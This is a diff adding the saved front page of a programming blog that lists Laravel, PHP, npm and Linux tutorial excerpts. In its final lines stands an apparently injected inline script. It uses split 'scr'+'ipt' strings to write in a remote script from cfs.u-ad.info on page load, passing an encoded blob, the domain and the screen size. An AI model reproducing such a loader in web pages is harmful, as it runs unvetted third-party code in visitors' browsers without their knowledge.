@@ -1,0 +1,474 @@
+
+
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="ie ie-no-support" lang="en-US"> <![endif]-->
+<!--[if IE 7]>         <html class="ie ie7" lang="en-US"> <![endif]-->
+<!--[if IE 8]>         <html class="ie ie8" lang="en-US"> <![endif]-->
+<!--[if IE 9]>         <html class="ie ie9" lang="en-US"> <![endif]-->
+<!--[if gt IE 9]><!--> <html lang="en-US"> <!--<![endif]-->
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title></title>
+        <meta name="viewport" content="width=device-width" />
+        <!--[if lt IE 9]>
+            <script src="http://www.aprillins.org/wp-content/themes/aprillinsorg-responsive/js/html5shiv.js"></script>
+        <![endif]-->
+        <link rel="alternate" type="application/rss+xml" title="APRILLINS.ORG &raquo; Feed" href="http://www.aprillins.org/feed" />
+<link rel="alternate" type="application/rss+xml" title="APRILLINS.ORG &raquo; Comments Feed" href="http://www.aprillins.org/comments/feed" />
+<meta name="description" content="Life documentation about programming, WordPress, Google matters, hacks, plugins, and more. Just read, watch, and learn" />
+<meta name="keywords" content="APRILLINS.ORG" />
+<meta name="robots" content="index,follow,noodp,noydir" />
+<link rel='stylesheet' id='wp-email-css'  href='http://www.aprillins.org/wp-content/plugins/wp-email/email-css.css?ver=2.50' type='text/css' media='all' />
+<link rel='stylesheet' id='aprillinsorgresponsive-styles-css'  href='http://www.aprillins.org/wp-content/themes/aprillinsorg-responsive/style.css?ver=1.0' type='text/css' media='all' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.aprillins.org/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.aprillins.org/wp-includes/wlwmanifest.xml" /> 
+    <script type="text/javascript" src="http://www.aprillins.org/wp-content/plugins/wp-code-highlightjs/highlight.common.pack.js"></script>
+    <link rel="stylesheet" href="http://www.aprillins.org/wp-content/plugins/wp-code-highlightjs/styles/default.css" />
+    <style>pre.hljs {padding: 5px;}
+pre.hljs code {}</style>
+    <script type="text/javascript">
+    (function($, window) {
+        var init_fn_flag = false;
+        var init_fn = (function() {
+            if (init_fn_flag)
+                return;
+
+            init_fn_flag = true;
+
+             hljs.configure({"tabReplace":"    "});
+            $('pre code').each(function(i, block) {
+                hljs.highlightBlock(block);
+            });
+            $('pre:not(:has(code))').each(function(i, block){
+                var class_desc = $(block).attr("class") || "";
+                var reg_mat = class_desc.match(/brush\s*:\s*([\w\d]+)/i);
+                if(!reg_mat || reg_mat.length < 2)
+                    return;
+
+                var code_content = $(block).removeClass("brush:").removeClass("ruler:").removeClass("first-line:").removeClass("highlight:")
+                    .removeClass("brush:" + reg_mat[1] + ";").removeClass(reg_mat[1] + ";").removeClass("true;").removeClass("false;").html();
+                $(block).empty().append($("<code></code>").html(code_content)).addClass('language-' + reg_mat[1]);
+                hljs.highlightBlock(block);
+            });
+           
+        });
+
+        $(document).ready(init_fn);
+        $(window).on("load", init_fn);
+    })(jQuery, window);
+    </script>
+<style type="text/css" id="syntaxhighlighteranchor"></style>
+        <!-- GPlus script -->
+        <script type="text/javascript" src="https://apis.google.com/js/plusone.js">
+          {lang: 'en'}
+        </script>
+        <!-- End of GPlus script -->
+                <script type="text/javascript">
+
+          var _gaq = _gaq || [];
+          _gaq.push(['_setAccount', 'UA-12350726-25']);
+          _gaq.push(['_trackPageview']);
+
+          (function() {
+            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+          })();
+
+        </script>
+            </head>
+    <body class="home blog">
+    <!-- Facebook script (place after <body>) -->
+    <div id="fb-root"></div>
+    <script>(function(d, s, id) {
+      var js, fjs = d.getElementsByTagName(s)[0];
+      if (d.getElementById(id)) return;
+      js = d.createElement(s); js.id = id;
+      js.src = "//connect.facebook.net/id_ID/sdk.js#xfbml=1&version=v2.0&appId=113869198637480";
+      fjs.parentNode.insertBefore(js, fjs);
+    }(document, 'script', 'facebook-jssdk'));</script>
+    <!-- End of Facebook script -->
+        <div class="container">
+            
+            <header class="site-header col-md-12 clearfix">
+
+                                    <img src="http://www.aprillins.org/wp-content/uploads/2015/01/cropped-cropped-Wallcate.com-Cityscapes-HD-Wallpaper-3.jpg" class="custom-header" height="" width="" alt="" />
+                                
+                <div class="col-md-12  bloginfo-wrapper">
+                    <a class="logo" href="http://www.aprillins.org" title="APRILLINS.ORG">
+                        <h1 class="blog-name">APRILLINS.ORG</h1>
+                    </a>
+                    
+                    <p class="lead blog-description">Programming &amp; Internet Stuff Archives</p>
+                </div>
+                
+                <nav class="col-md-12 navbar-default" role="navigation">
+                
+                    <div class="container-fluid">
+                        <!-- Brand and toggle get grouped for better mobile display -->
+                        <div class="navbar-header">
+                          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                            <span class="sr-only">Toggle navigation</span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                          </button>
+                          
+                        </div>
+                    
+                            <div id="bs-example-navbar-collapse-1" class="collapse navbar-collapse"><ul id="menu-top-menu" class="nav navbar-nav"><li id="menu-item-281" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-281 active"><a title="Home" href="http://www.aprillins.org/">Home</a></li>
+<li id="menu-item-273" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-273"><a title="WordPress" href="http://www.aprillins.org/view/category/wordpress">WordPress</a></li>
+<li id="menu-item-274" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-274"><a title="Linux" href="http://www.aprillins.org/view/category/linux">Linux</a></li>
+<li id="menu-item-275" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-275"><a title="Google" href="http://www.aprillins.org/view/category/google">Google</a></li>
+<li id="menu-item-276" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-276"><a title="Internet" href="http://www.aprillins.org/view/category/internet">Internet</a></li>
+<li id="menu-item-277" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-277"><a title="Plugins" href="http://www.aprillins.org/view/category/plugins">Plugins</a></li>
+<li id="menu-item-278" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-278"><a title="Programming" href="http://www.aprillins.org/view/category/programming">Programming</a></li>
+<li id="menu-item-279" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-279"><a title="Multimedia" href="http://www.aprillins.org/view/category/multimedia">Multimedia</a></li>
+<li id="menu-item-280" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-280"><a title="Software" href="http://www.aprillins.org/view/category/software">Software</a></li>
+</ul></div>                 </div>
+                    
+                </nav>
+
+            </header>
+            <div class="col-md-12 container-inner clearfix"> <!-- wrapper between content and sidebar  -->
+                    
+        
+            <div id="carousel-example-generic" class="carousel-front carousel slide col-md-12" data-ride="carousel"> <!-- carousel -->
+              <!-- Indicators -->
+              <ol class="carousel-indicators">
+                <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
+                <li data-target="#carousel-example-generic" data-slide-to="1"></li>
+                <li data-target="#carousel-example-generic" data-slide-to="2"></li>
+              </ol>
+            
+              <!-- Wrapper for slides -->
+              <div class="carousel-inner" role="listbox">
+                <div class="item active">
+                  <img src="http://www.aprillins.org/wp-content/themes/aprillinsorg-responsive/images/pictures/pic1.jpg" alt="...">
+                  <div class="carousel-caption">
+                        I love the city..
+                  </div>
+                </div>
+                <div class="item">
+                  <img src="http://www.aprillins.org/wp-content/themes/aprillinsorg-responsive/images/pictures/pic2.jpg" alt="...">
+                  <div class="carousel-caption">
+                        Look at that building!
+                  </div>
+                </div>
+                <div class="item">
+                  <img src="http://www.aprillins.org/wp-content/themes/aprillinsorg-responsive/images/pictures/pic3.jpg" alt="...">
+                  <div class="carousel-caption">
+                        Cityscape is amazing..
+                  </div>
+                </div>
+                
+               
+              </div>
+            
+              <!-- Controls -->
+              <a class="left carousel-control" href="#carousel-example-generic" role="button" data-slide="prev">
+                <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
+                <span class="sr-only">Previous</span>
+              </a>
+              <a class="right carousel-control" href="#carousel-example-generic" role="button" data-slide="next">
+                <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
+                <span class="sr-only">Next</span>
+              </a>
+            </div> <!-- end of carousel -->
+        
+        
+    
+        <div class="col-md-4 col-sm-12">
+                                <div class="video-youtube">
+                        <iframe width="560" height="315" src="//www.youtube.com/embed/8P0ePyYyCM8?rel=0" frameborder="0" allowfullscreen></iframe>  
+                    </div>
+                                <div class="video-youtube">
+                        <iframe width="560" height="315" src="//www.youtube.com/embed/1hWdxN3Sxdk?rel=0" frameborder="0" allowfullscreen></iframe>  
+                    </div>
+                                <div class="video-youtube">
+                        <iframe width="560" height="315" src="//www.youtube.com/embed/i_4Kh5kE3xA?rel=0" frameborder="0" allowfullscreen></iframe>  
+                    </div>
+                                <div class="video-youtube">
+                        <iframe width="560" height="315" src="//www.youtube.com/embed/-q8Jj4aAWYw?rel=0" frameborder="0" allowfullscreen></iframe>  
+                    </div>
+                        
+        </div><!-- video-youtube -->
+        <div class="col-md-8 col-sm-12 content-wrapper frontpage"> <!-- content wrapper index -->
+            <section class="page-content primary" role="main">
+                
+<article id="post-373" class="post-373 post type-post status-publish format-standard hentry category-programming tag-laravel tag-mime-type tag-php">
+
+    <h2 class="post-title">
+            <a href="http://www.aprillins.org/view/373/checking-mime-type-of-external-url-using-php" rel="bookmark">Checking Mime-Type of External URL Using PHP            </a>
+    </h2>
+
+
+    <div class="post-content">
+        
+            <p>I was overwhelmed by Mime-Type while I was working for a project. The problem is I don&#8217;t know how to retrieve the mime-type from a file, particularly file from another host. This url is the one I want t check its mime-type. Why do I have to check it? Because it doesn&#8217;t have proper extension [&hellip;]</p>
+            <a class="btn btn-danger" href="http://www.aprillins.org/view/373/checking-mime-type-of-external-url-using-php">Read more &raquo;</a>
+
+        
+        
+
+    </div>
+
+</article>
+
+<article id="post-366" class="post-366 post type-post status-publish format-standard hentry category-programming tag-database tag-eloquent tag-laravel tag-laravel-5 tag-relationship">
+
+    <h2 class="post-title">
+            <a href="http://www.aprillins.org/view/366/laravel-5-belongstomany-by-using-pivot-table-example" rel="bookmark">Laravel 5 belongsToMany() by Using Pivot Table Example          </a>
+    </h2>
+
+
+    <div class="post-content">
+        
+            <p>Relationship using pivot table in Laravel 5? A method, belongsToMany(), is a part of Eloquent ORM in Laravel 5. It connects between tables and it has many to many relationship. In order to use it, you must have two models three tables.</p>
+            <a class="btn btn-danger" href="http://www.aprillins.org/view/366/laravel-5-belongstomany-by-using-pivot-table-example">Read more &raquo;</a>
+
+        
+        
+
+    </div>
+
+</article>
+
+<article id="post-361" class="post-361 post type-post status-publish format-standard hentry category-programming tag-blade tag-laravel tag-laravel-5">
+
+    <h2 class="post-title">
+            <a href="http://www.aprillins.org/view/361/blade-template-doesnt-work-in-laravel-5" rel="bookmark">Blade Template Doesn&#8217;t Work in Laravel 5           </a>
+    </h2>
+
+
+    <div class="post-content">
+        
+            <p>No, that&#8217;s not true the Blade Template is still working in Laravel 5, but its tag directive has been changed. For some of you who don&#8217;t read the Laravel development change log may not know about this. The documentation said that &#8220;For better security by default, Laravel 5.0 escapes all output from both the {{ [&hellip;]</p>
+            <a class="btn btn-danger" href="http://www.aprillins.org/view/361/blade-template-doesnt-work-in-laravel-5">Read more &raquo;</a>
+
+        
+        
+
+    </div>
+
+</article>
+
+<article id="post-355" class="post-355 post type-post status-publish format-standard hentry category-programming tag-laravel tag-laravel-5">
+
+    <h2 class="post-title">
+            <a href="http://www.aprillins.org/view/355/how-to-add-form-class-in-laravel-5" rel="bookmark">How to Add Form Class in Laravel 5            </a>
+    </h2>
+
+
+    <div class="post-content">
+        
+            <p>Many of you will question about the error like HandleExceptions->fatalExceptionFromError( array(&#8216;type&#8217; => &#8216;1&#8217;, &#8216;message&#8217; => &#8216;Class &#8216;Form&#8217; not found&#8217; or FatalErrorException in 193a332e9290704ad006bafdbd047286 line 2: Class &#8216;Form&#8217; not found. Hmm, you must be just upgrading your Laravel 4 to Laravel 5 weren&#8217;t you? Laravel 5 doesn&#8217;t include the Form class like the previous version. It [&hellip;]</p>
+            <a class="btn btn-danger" href="http://www.aprillins.org/view/355/how-to-add-form-class-in-laravel-5">Read more &raquo;</a>
+
+        
+        
+
+    </div>
+
+</article>
+
+<article id="post-352" class="post-352 post type-post status-publish format-standard hentry category-programming tag-laravel tag-laravel-5">
+
+    <h2 class="post-title">
+            <a href="http://www.aprillins.org/view/352/how-to-change-public-to-public_html-on-laravel-5-ubuntu" rel="bookmark">How to Change public To public_html On Laravel 5 Ubuntu          </a>
+    </h2>
+
+
+    <div class="post-content">
+        
+            <p>Laravel 5 has different level from previous version. It becomes simpler and it has different file structure. That was making me confused at the first time when I was trying to migrate from previous version. The odd is bootstrap/paths.php doesn&#8217;t exist anymore. Now, how do I set the public folder of my project to desired [&hellip;]</p>
+            <a class="btn btn-danger" href="http://www.aprillins.org/view/352/how-to-change-public-to-public_html-on-laravel-5-ubuntu">Read more &raquo;</a>
+
+        
+        
+
+    </div>
+
+</article>
+
+<article id="post-349" class="post-349 post type-post status-publish format-standard hentry category-linux tag-files tag-terminal">
+
+    <h2 class="post-title">
+            <a href="http://www.aprillins.org/view/349/count-number-of-files-and-folders-in-a-directory-using-terminal" rel="bookmark">Count Number of Files and Folders in a Directory Using Terminal          </a>
+    </h2>
+
+
+    <div class="post-content">
+        
+            <p>I Googled so much and can&#8217;t find any simpler method to count files or folders in a directory in Linux. I am using Ubuntu 14.04. If it&#8217;s only files and folders, it would be simple. Count Files and Folders $ ls -l | wc -l The wc -l command is read &#8220;WordCount lines&#8221;. It means [&hellip;]</p>
+            <a class="btn btn-danger" href="http://www.aprillins.org/view/349/count-number-of-files-and-folders-in-a-directory-using-terminal">Read more &raquo;</a>
+
+        
+        
+
+    </div>
+
+</article>
+
+<article id="post-347" class="post-347 post type-post status-publish format-standard hentry category-linux tag-chmod tag-file-permission tag-ubuntu">
+
+    <h2 class="post-title">
+            <a href="http://www.aprillins.org/view/347/changing-directory-and-files-permission-recursively-in-linux" rel="bookmark">Changing Directory and Files Permission Recursively in Linux            </a>
+    </h2>
+
+
+    <div class="post-content">
+        
+            <p>I&#8217;ve discovered the hidden treasure at superuser to change the permission of directories or files recursively in a folder. Not quite simple, but straight. To recursively give directories read &#038; execute privileges:</p>
+            <a class="btn btn-danger" href="http://www.aprillins.org/view/347/changing-directory-and-files-permission-recursively-in-linux">Read more &raquo;</a>
+
+        
+        
+
+    </div>
+
+</article>
+
+<article id="post-343" class="post-343 post type-post status-publish format-standard hentry category-linux tag-compass tag-grunt tag-livereload tag-sass">
+
+    <h2 class="post-title">
+            <a href="http://www.aprillins.org/view/343/my-gruntfile-js-content-using-compass-and-watch" rel="bookmark">My Gruntfile.js Content Using Compass and Watch          </a>
+    </h2>
+
+
+    <div class="post-content">
+        
+            <p>Now, say you don&#8217;t know how to create Gruntfile.js manually just like I was. You&#8217;re desperately want to use Compass (grunt-contrib-compass) and Watch (grunt-contrib-watch) to develop your project. First, you have to install it in your project folder as node_modules: $ npm install grunt-contrib-compass grunt-contrib-watch That will install the Compass and Watch into node_modules directory [&hellip;]</p>
+            <a class="btn btn-danger" href="http://www.aprillins.org/view/343/my-gruntfile-js-content-using-compass-and-watch">Read more &raquo;</a>
+
+        
+        
+
+    </div>
+
+</article>
+
+<article id="post-337" class="post-337 post type-post status-publish format-standard hentry category-linux">
+
+    <h2 class="post-title">
+            <a href="http://www.aprillins.org/view/337/how-to-see-available-node-js-global-package-using-npm" rel="bookmark">How To See Available Node.js Global Package Using NPM          </a>
+    </h2>
+
+
+    <div class="post-content">
+        
+            <p>Some of you might be very disturbed by a question of how to know Node.js packages which globally installed in your Ubuntu 14.04 LTS. Such a terrible nightmare. But, the nightmare should be vanished using this simple one liner: $ npm ls -g &#8211;depth=0 That line would be similar to: $ ls /usr/lib/node_modules</p>
+            <a class="btn btn-danger" href="http://www.aprillins.org/view/337/how-to-see-available-node-js-global-package-using-npm">Read more &raquo;</a>
+
+        
+        
+
+    </div>
+
+</article>
+
+<article id="post-334" class="post-334 post type-post status-publish format-standard hentry category-linux tag-nodejs tag-npm">
+
+    <h2 class="post-title">
+            <a href="http://www.aprillins.org/view/334/npm-global-as-reference-of-npm-local" rel="bookmark">NPM Global As Reference of NPM Local            </a>
+    </h2>
+
+
+    <div class="post-content">
+        
+            <p>How to refer NPM Local to NPM Global? If you don&#8217;t want to install the packages locally because it&#8217;s wasting hardisk space you can use the packages which have globally installed. For example, you install the sass package globally: $ sudo npm install -g grunt-contrib-sass You don&#8217;t want to do the same for your project, [&hellip;]</p>
+            <a class="btn btn-danger" href="http://www.aprillins.org/view/334/npm-global-as-reference-of-npm-local">Read more &raquo;</a>
+
+        
+        
+
+    </div>
+
+</article>
+                <div class="paginate-links">
+
+                
+                    <span class='page-numbers current'>1</span>
+<a class='page-numbers' href='http://www.aprillins.org/page/2'>2</a>
+<a class='page-numbers' href='http://www.aprillins.org/page/3'>3</a>
+<span class="page-numbers dots">&hellip;</span>
+<a class='page-numbers' href='http://www.aprillins.org/page/8'>8</a>
+<a class="next page-numbers" href="http://www.aprillins.org/page/2">Next &raquo;</a>                
+            
+                </div>
+            </section> <!-- end of page-content -->
+        
+        </div> <!-- content wrapper -->
+        
+        
+                                        
+                </div> <!-- end of wrapper between content and sidebar  -->
+                                <div class="col-md-12 category-bottom">
+                    <div class="category-list col-md-12 clearfix">
+                        <h3>Categories</h3>
+                        <ul class="list-inline">
+                                <li class="cat-item cat-item-40"><a href="http://www.aprillins.org/view/category/google" >Google</a>
+</li>
+    <li class="cat-item cat-item-53"><a href="http://www.aprillins.org/view/category/internet" >Internet</a>
+</li>
+    <li class="cat-item cat-item-3"><a href="http://www.aprillins.org/view/category/linux" >Linux</a>
+</li>
+    <li class="cat-item cat-item-31"><a href="http://www.aprillins.org/view/category/multimedia" >Multimedia</a>
+</li>
+    <li class="cat-item cat-item-16"><a href="http://www.aprillins.org/view/category/plugins" >Plugins</a>
+</li>
+    <li class="cat-item cat-item-69"><a href="http://www.aprillins.org/view/category/programming" >Programming</a>
+</li>
+    <li class="cat-item cat-item-172"><a href="http://www.aprillins.org/view/category/software" >Software</a>
+</li>
+    <li class="cat-item cat-item-1"><a href="http://www.aprillins.org/view/category/uncategorized" >Uncategorized</a>
+</li>
+    <li class="cat-item cat-item-50"><a href="http://www.aprillins.org/view/category/wordpress" >WordPress</a>
+</li>
+                        </ul>
+                    </div>
+                    <div class="category-list even col-md-12 clearfix">
+                        <h3>Archives</h3>
+                        <ul class="list-inline">
+                                <li><a href='http://www.aprillins.org/view/date/2015/03'>March 2015</a></li>
+    <li><a href='http://www.aprillins.org/view/date/2015/02'>February 2015</a></li>
+    <li><a href='http://www.aprillins.org/view/date/2015/01'>January 2015</a></li>
+    <li><a href='http://www.aprillins.org/view/date/2014/10'>October 2014</a></li>
+    <li><a href='http://www.aprillins.org/view/date/2014/09'>September 2014</a></li>
+                        </ul>
+                    </div>
+                    
+                    <div class="category-list col-md-12 clearfix">
+                    <h3>Trending Tags</h3>
+                        <ul class="list-inline">
+                            <li><a href='http://www.aprillins.org/view/tag/apache' class='tag-link-5' title='5 topics' style='font-size: 100%;'>Apache</a></li>
+<li><a href='http://www.aprillins.org/view/tag/database' class='tag-link-70' title='5 topics' style='font-size: 100%;'>Database</a></li>
+<li><a href='http://www.aprillins.org/view/tag/firefox-4' class='tag-link-142' title='4 topics' style='font-size: 100%;'>Firefox 4</a></li>
+<li><a href='http://www.aprillins.org/view/tag/google-chrome' class='tag-link-17' title='6 topics' style='font-size: 100%;'>Google Chrome</a></li>
+<li><a href='http://www.aprillins.org/view/tag/laravel' class='tag-link-211' title='7 topics' style='font-size: 100%;'>Laravel</a></li>
+<li><a href='http://www.aprillins.org/view/tag/laravel-5' class='tag-link-228' title='4 topics' style='font-size: 100%;'>Laravel 5</a></li>
+<li><a href='http://www.aprillins.org/view/tag/mysql' class='tag-link-10' title='5 topics' style='font-size: 100%;'>MySQL</a></li>
+<li><a href='http://www.aprillins.org/view/tag/php' class='tag-link-6' title='7 topics' style='font-size: 100%;'>PHP</a></li>
+<li><a href='http://www.aprillins.org/view/tag/terminal' class='tag-link-9' title='3 topics' style='font-size: 100%;'>Terminal</a></li>
+<li><a href='http://www.aprillins.org/view/tag/ubuntu' class='tag-link-4' title='12 topics' style='font-size: 100%;'>Ubuntu</a></li>
+                            
+                        </ul>
+                    </div>
+                </div> <!-- category-bottom -->
+                                <footer class="col-md-12 footer">
+                    <nav class="navbar-default col-md-12 clearfix" role="navigation"><div class="menu-bottom-menu-container"><ul class="nav navbar-nav"><li id="menu-item-321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-321"><a href="http://www.aprillins.org/bookmarks">Bookmarks</a></li>
+<li id="menu-item-322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-322"><a href="http://www.aprillins.org/about">About</a></li>
+<li id="menu-item-320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-320"><a href="http://www.aprillins.org/contact-us">Contact Us</a></li>
+</ul></div>
+                    </nav>
+                    <div class="copyright col-md-12">
+                        &copy; APRILLINS.ORG 2014. All rights reserved.
+                    </div>
+                </footer>
+            </div> <!-- end of container -->
+            
+        <script type='text/javascript' src='http://www.aprillins.org/wp-content/themes/aprillinsorg-responsive/js/jquery-2.1.1.min.js?ver=4.1.1'></script>
+<script type='text/javascript' src='http://www.aprillins.org/wp-content/themes/aprillinsorg-responsive/js/bootstrap.min.js?ver=4.1.1'></script>
+    <script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRBth6A2%2fJb53XI2LB6thlczDAM6qjfDiCmHujSHz1kkY5wBk1bSfKxk3GXRpLfETl3W%2bxY%2fP2cp3oBFV75Ch581pEfgdkMaBG%2fc9B8xX8RxpwYMJmGctNk4fAHTgXQ6QjRv2m0qkj%2btlIRPHNKSuwWZjKhaB3bmFH7KoMlB46x1RUEmkgeY%2fRCKBLqVmSKGJgiA82yHeh3JS6NrLMOzeiyIcVWTvy2oV7mEMmPSFUSIaJV48Hd24gQi1%2fmr43F2VCz8TWBgCOBmb%2frRTTiNgfAyVCl%2ftehqCV1i8MZzPyjKUCcIXf2gdGOonPMkjS9DrtRIQw0oC%2blbRkfOxefzxWF3Ha9JUQMeXEyJR0F0YTq5c62XfmA47CxD3ldLuOS0O8svsUF1v0KL9KG1xvS851c4tcKhbcpHv695Ny7TOM76mUKpY%2bAShvAZAlZdovL6AbzK5CZ4Z3%2fzlzNtFK8TuY6%2fx9ppP%2bFeV993CSDzuTI7zA9K91hw39FP8p%2foY59y4%2b76ngz00C1ttgMNWyZWsy9UmK4%2bJ7gy%2bh5%2b56nasqGCc%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
+</html>
